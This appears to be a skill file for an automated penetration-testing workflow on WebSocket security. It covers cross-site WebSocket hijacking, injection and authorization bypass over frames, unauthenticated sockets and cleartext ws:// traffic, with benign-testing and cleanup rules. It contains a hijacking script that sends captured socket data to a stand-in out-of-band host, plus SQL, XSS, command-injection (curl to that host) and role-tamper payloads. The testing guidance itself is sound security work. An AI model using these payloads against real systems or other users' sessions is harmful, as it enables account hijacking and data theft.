# WebSocket security (CSWSH · message-layer · socket authz · cleartext)

The WebSocket (WS/WSS) surface. A WS connection starts as an HTTP `Upgrade` handshake, then becomes a
long-lived bidirectional frame channel. Its security model differs from ordinary HTTP in two decisive ways:
the browser auto-sends ambient cookies on the handshake (so a cross-origin page can open an authenticated
socket — CSWSH), and the frame layer is frequently unprotected by the CSRF/authz controls the HTTP routes
enjoy. Where `js-analysis` ENUMERATES the `ws(s)://` / `new WebSocket(...)` endpoints and `auth-context`
characterizes the handshake auth model, this skill EXPLOITS them.

## Prime directive — a REAL break is the proof; a 101 upgrade is NOT a finding
A WebSocket endpoint that merely upgrades (`101 Switching Protocols`) is RECON. The finding exists only when
a real break is proven benignly: a cross-origin authenticated handshake accepted with a benign READ frame
returning the victim's data (CSWSH), a message-layer injection / authz bypass shown by a before/after STATE
differential, an unauthenticated privileged frame, or sensitive data over `ws://` cleartext. Keep every probe
benign — a READ frame for CSWSH, a benign marker / no-op for state tests, TEST accounts only; never flood or
oversize frames (DoS), never drive CSWSH against a real user's session.

## Ingest (from js-analysis + auth-context)
- `js-analysis/out/<site>/findings/endpoints.jsonl` — the `ws(s)://` + `new WebSocket(...)` endpoints
  (js-analysis extracts them from the bundles; **consume its output, do not re-run it**).
- `auth-context/auth_context.json` — the session mechanism on the handshake: an ambient **cookie** (flags:
  Secure/HttpOnly/SameSite) vs a **token** carried in the first frame / a query param, and whether `Origin`
  is validated. This is the single most important input: **cookie-authenticated + no Origin check = CSWSH**.
- `scope.yaml` — `oob.collaborator` and ≥2 tester identities (for authz/IDOR over frames).

## The WebSocket trust model (what breaks)
1. **Handshake auth = ambient cookie** → the browser sends it on a CROSS-ORIGIN upgrade automatically. If
   `Origin` is not validated, a page on `attacker.test` opens an AUTHENTICATED socket as the victim (CSWSH) —
   the WS analog of CSRF, but it also allows **reading** the victim's data (full duplex), not just a blind
   write.
2. **Frame layer skips authz** → the HTTP routes check object ownership / role, but the frame handlers trust
   the socket is already "the right user" and skip per-message authz — so a frame with another identity's
   object id (IDOR) or a role/privilege-tamper JSON frame is honored.
3. **Frame input reaches a sink** → a frame value is concatenated into SQL, an OS command, or rendered into
   the DOM of other users of a chat/collab feature — the injection travels over the socket.
4. **No socket auth / cleartext** → the socket accepts unauthenticated connections and serves privileged
   data, or runs over `ws://` so sensitive frames are in cleartext.

## 1. Map each endpoint
Per `ws(s)://` endpoint: what authenticates the handshake (cookie vs token), is `Origin` validated, what is
the frame protocol (JSON op/args? a custom text protocol?), and which frames READ vs CHANGE state. Record the
handshake request + a baseline authenticated frame exchange.

## 2. CSWSH (cross-site WebSocket hijacking) — primary high-value break
Open the socket from a tester-controlled CROSS-ORIGIN page while the tester's own session cookie is present,
and send a benign READ frame:
```html
<!-- served from https://attacker.test (tester-controlled) -->
<script>
  const ws = new WebSocket("wss://app.target/ws");          // browser auto-sends the app's cookie
  ws.onopen  = () => ws.send(JSON.stringify({op:"get_profile"}));   // benign READ
  ws.onmessage = (e) => fetch("https://<token>.oob.example/?d=" + btoa(e.data));  // exfil to tester OOB (own data)
</script>
```
**Proof of effect:** the cross-origin socket is accepted (handshake succeeds carrying the ambient cookie) AND
the benign READ frame returns the tester's own data to the attacker-origin page. Decisive: the handshake
authenticates by **cookie** and `Origin` is not validated. De-dupe vs `csrf` (this is the WS-handshake
analog; drive it against the tester's OWN session, never a real user). Use `_contract/browser-session.md`
when a real browser is needed to establish the authenticated session.

## 3. Message-layer injection over frames
Send frames carrying injection payloads; observe the reply and any downstream effect:
```
{"op":"search","q":"' OR '1'='1"}                 # SQL over a frame      -> route to sqli-*
{"op":"post","msg":"<img src=x onerror=alert(1)>"} # XSS rendered to other users -> route to xss-*
{"op":"run","cmd":"id; curl <token>.oob.example"}  # OS command over a frame -> route to command-injection
{"op":"update","__proto__":{"polluted":"1"}}       # prototype pollution via JSON frame -> route to prototype-pollution
```
This skill proves the frame REACHES the sink; the downstream **detonation** is confirmed by the owning class
(`xss-*`/`sqli-*`/`command-injection`/`prototype-pollution`) — do not double-claim it here.

## 4. Authz / IDOR over frames (two identities)
With identity B's socket, send a frame referencing identity A's object id; check a cross-identity read/change
with a before/after state differential:
```
{"op":"get_order","id":"<A's order id>"}          # does B read A's order?
{"op":"set_role","user":"B","role":"admin"}        # is a privilege-tamper frame honored?
```
**Proof of effect:** B reads/changes A's resource (before/after state), or the role tamper takes effect —
because the frame handler skipped per-message authz.

## 5. Missing auth on the socket
Connect WITHOUT credentials and attempt a privileged read/action frame:
```
websocat wss://app.target/ws          # no cookie / no token
> {"op":"admin_stats"}
```
**Proof of effect:** the unauthenticated connection executes a PRIVILEGED frame (not just a 101 upgrade — an
unauthenticated 101 that then rejects every frame is not a finding).

## 6. `ws://` cleartext
If the endpoint is `ws://` (not `wss://`), confirm sensitive data traverses it in cleartext (benign capture).
Transport cipher weaknesses on `wss://` are `tls-attacks`, not this class.

## 7. Confirm + rate (benign)
Confirmation = a REAL break reproduced (≥2) with the accepted cross-origin read / before-after state / OOB
recorded into `poc/<id>/`, secrets redacted. Rate by impact:
- **CSWSH reading sensitive data / authz-IDOR over frames / missing-auth privileged action** → **High**
  (Critical when it chains to ATO or mass data access — coordinate the downstream leg).
- **Message-layer injection reaching a sink** → rate to the sink demonstrated, and route the detonation to
  its owning class.
- **`ws://` cleartext of sensitive data** → **Medium**; `ws://` with nothing sensitive → **Low**.

## De-dup — hand these OFF (don't re-report)
| Observation | Owner |
|---|---|
| Frame content rendered as script in a browser | `xss-*` |
| Frame value reaching a SQL backend | `sqli-*` |
| Frame value reaching an OS command | `command-injection` |
| Prototype pollution via a JSON frame | `prototype-pollution` |
| Ordinary cross-origin state-changing HTTP form (not a WS handshake) | `csrf` |
| TLS/cipher/cert weakness on `wss://` | `tls-attacks` |
| Bare handshake-token forgery (JWT alg/secret/claim, OAuth flow) on its own | `jwt` / `oauth` |
THIS skill keeps the **WebSocket break** itself: CSWSH, authz/IDOR over frames, missing socket auth, `ws://`
cleartext, and proving a frame reaches an injection sink.

## Cleanup
TEST accounts + benign markers only; drive CSWSH against the tester's OWN session; revert any test record a
state-changing frame created and record it in `cleanup.md`. No message-flood / oversized-frame DoS. Redact any
secret the frames carry to a fingerprint and delete captured copies that hold a real secret.
